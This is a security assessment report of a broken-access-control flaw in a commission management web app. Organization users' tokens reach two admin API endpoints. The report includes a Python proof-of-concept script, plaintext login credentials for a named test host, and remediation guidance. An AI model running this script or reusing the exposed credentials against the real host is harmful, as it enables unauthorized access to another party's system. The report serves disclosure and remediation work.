# Vertical Privilege Escalation: Organization Users Can Access Admin Endpoints

**ID:** vuln-0005
**Severity:** HIGH
**Found:** 2026-02-26 12:30:39 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/admin/menu-api-access/get-all, /api/Role/GetAllControllers
**Method:** GET
**CWE:** CWE-284
**CVSS:** 8.3

## Description

A critical vertical privilege escalation vulnerability was discovered in the commission management application. Organization users, who should only have access to organization-specific functionality, can successfully access sensitive administrative endpoints that are intended to be restricted to admin users only.

The vulnerability exists because the application fails to properly enforce role-based access control on administrative endpoints. When an Organization user authenticates, they receive a JWT token that appears to grant them only organization-level privileges. However, this token is accepted by admin-only endpoints, allowing unauthorized access to sensitive administrative functionality.

This vulnerability was discovered during comprehensive access control testing and validated through multiple proof-of-concept tests.

## Impact

Successful exploitation of this vulnerability enables Organization users to:

1. **Access Sensitive Administrative Functionality**: Gain access to admin-only endpoints that reveal complete application structure, menu configurations, and available controllers/actions
2. **Information Disclosure**: Obtain detailed information about application architecture, security controls, and available functionality that should be restricted
3. **Privilege Escalation Pathway**: Establish a foothold for further privilege escalation attacks by understanding the application's internal structure
4. **Security Control Bypass**: Circumvent intended access controls and security boundaries
5. **Regulatory Compliance Violations**: Potentially violate data protection regulations by accessing unauthorized administrative functions

The business impact includes unauthorized access to administrative configuration, potential for further attacks, and violation of the principle of least privilege.

## Technical Analysis

The vulnerability exists due to inadequate role-based access control enforcement on administrative endpoints. The application appears to rely on client-side controls or insufficient server-side validation to restrict access to admin-only functionality.

Key technical observations:
1. **Authentication Mechanism**: The application uses JWT tokens with role claims (e.g., "ROLE_ADMIN", "ROLE_USER")
2. **Endpoint Protection**: Admin endpoints like `/api/admin/menu-api-access/get-all` and `/api/Role/GetAllControllers` should be protected by role validation
3. **Access Control Failure**: Organization users can successfully access these endpoints despite not having the ROLE_ADMIN claim in their primary role
4. **Token Validation**: The application appears to accept tokens with organization-level privileges for admin endpoints

The root cause appears to be either:
- Missing or improper server-side role validation on admin endpoints
- Overly permissive token validation logic
- Incorrect role assignment during authentication
- Client-side only access control that can be bypassed

## Proof of Concept

To reproduce this vulnerability:

1. **Authenticate as Organization User**:
   - Username: nlnarayana3858@gmail.com
   - Password: User@1234
   - Obtain the JWT token from the authentication response

2. **Access Admin Endpoint**:
   - Send a GET request to `/api/admin/menu-api-access/get-all` with the Organization user's JWT token
   - Include the following headers:
     ```
     Authorization: Bearer [Organization User JWT Token]
     Content-Type: application/json
     ```

3. **Observe Successful Response**:
   - The server responds with HTTP 200 OK
   - The response contains complete menu access configuration data
   - This data should only be accessible to admin users

4. **Access Additional Admin Endpoint**:
   - Send a GET request to `/api/Role/GetAllControllers` with the same Organization user token
   - Observe that the server responds with complete controller information

5. **Compare with Admin Access**:
   - Repeat the same requests with an Admin user token
   - Observe that the responses are identical, confirming the access control failure

```
import requests
import json

# Configuration
BASE_URL = "https://commissionstest.callippus.in"
AUTH_ENDPOINT = f"{BASE_URL}/api/authenticate"
ADMIN_ENDPOINT = f"{BASE_URL}/api/admin/menu-api-access/get-all"
CONTROLLERS_ENDPOINT = f"{BASE_URL}/api/Role/GetAllControllers"

# Organization User Credentials
ORG_CREDENTIALS = {
    "email": "nlnarayana3858@gmail.com",
    "password": "User@1234",
    "rememberMe": False
}

def authenticate(email, password):
    """Authenticate and return JWT token"""
    response = requests.post(
        AUTH_ENDPOINT,
        json={"email": email, "password": password, "rememberMe": False},
        headers={"Content-Type": "application/json"}
    )
    if response.status_code == 200:
        return response.json().get("id_token")
    else:
        raise Exception(f"Authentication failed: {response.status_code} - {response.text}")

def test_admin_access(token):
    """Test access to admin endpoints with Organization user token"""
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    # Test access to menu API access endpoint
    menu_response = requests.get(
        ADMIN_ENDPOINT,
        headers=headers,
        params={"startRow": 0, "endRow": 25, "sortModel": "[]", "filterModel": "{}"}
    )

    # Test access to controllers endpoint
    controllers_response = requests.get(
        CONTROLLERS_ENDPOINT,
        headers=headers
    )

    return {
        "menu_access": {
            "status": menu_response.status_code,
            "success": menu_response.status_code == 200,
            "data_length": len(menu_response.text) if menu_response.status_code == 200 else 0
        },
        "controllers_access": {
            "status": controllers_response.status_code,
            "success": controllers_response.status_code == 200,
            "data_length": len(controllers_response.text) if controllers_response.status_code == 200 else 0
        }
    }

def main():
    print("=== Vertical Privilege Escalation Proof of Concept ===")
    print(f"Testing access to admin endpoints with Organization user credentials")
    print()

    try:
        # Step 1: Authenticate as Organization user
        print("1. Authenticating as Organization user...")
        org_token = authenticate(ORG_CREDENTIALS["email"], ORG_CREDENTIALS["password"])
        print(f"   Authentication successful. Token: {org_token[:20]}...")

        # Step 2: Test access to admin endpoints
        print("\n2. Testing access to admin endpoints...")
        results = test_admin_access(org_token)

        # Step 3: Display results
        print(f"\nResults:")
        print(f"   Menu API Access Endpoint:")
        print(f"     Status: {results['menu_access']['status']}")
        print(f"     Access Granted: {'YES' if results['menu_access']['success'] else 'NO'}")
        print(f"     Response Length: {results['menu_access']['data_length']} bytes")

        print(f"\n   Controllers Endpoint:")
        print(f"     Status: {results['controllers_access']['status']}")
        print(f"     Access Granted: {'YES' if results['controllers_access']['success'] else 'NO'}")
        print(f"     Response Length: {results['controllers_access']['data_length']} bytes")

        if results['menu_access']['success'] and results['controllers_access']['success']:
            print("\n✅ VULNERABILITY CONFIRMED: Organization user can access admin endpoints")
            print("   This represents a critical vertical privilege escalation vulnerability")
        else:
            print("\n❌ No vulnerability detected: Organization user cannot access admin endpoints")

    except Exception as e:
        print(f"\n❌ Error during testing: {str(e)}")

if __name__ == "__main__":
    main()
```

## Remediation

To remediate this vertical privilege escalation vulnerability:

1. **Implement Proper Role-Based Access Control (RBAC)**:
   - Implement server-side validation on ALL administrative endpoints
   - Ensure that only users with the ROLE_ADMIN claim can access admin endpoints
   - Use a centralized authorization middleware for consistent enforcement

2. **Endpoint Protection**:
   ```csharp
   // Example ASP.NET Core authorization attribute
   [Authorize(Roles = "ROLE_ADMIN")]
   [HttpGet("admin/menu-api-access/get-all")]
   public IActionResult GetMenuApiAccess() { ... }
   ```

3. **Token Validation**:
   - Ensure JWT token validation properly checks role claims
   - Implement audience and issuer validation
   - Set appropriate token expiration times

4. **Role Assignment**:
   - Review and correct role assignment logic during authentication
   - Ensure Organization users receive only organization-level roles
   - Implement proper role inheritance and separation

5. **Defense in Depth**:
   - Implement additional authorization checks at the business logic layer
   - Use feature flags to control access to sensitive functionality
   - Implement audit logging for all administrative actions

6. **Testing**:
   - Implement automated tests to verify access control enforcement
   - Test with users of different roles to ensure proper restrictions
   - Include negative test cases for unauthorized access attempts

7. **Monitoring**:
   - Implement monitoring for unauthorized access attempts
   - Set up alerts for suspicious activity on admin endpoints
   - Regularly review access logs for anomalies

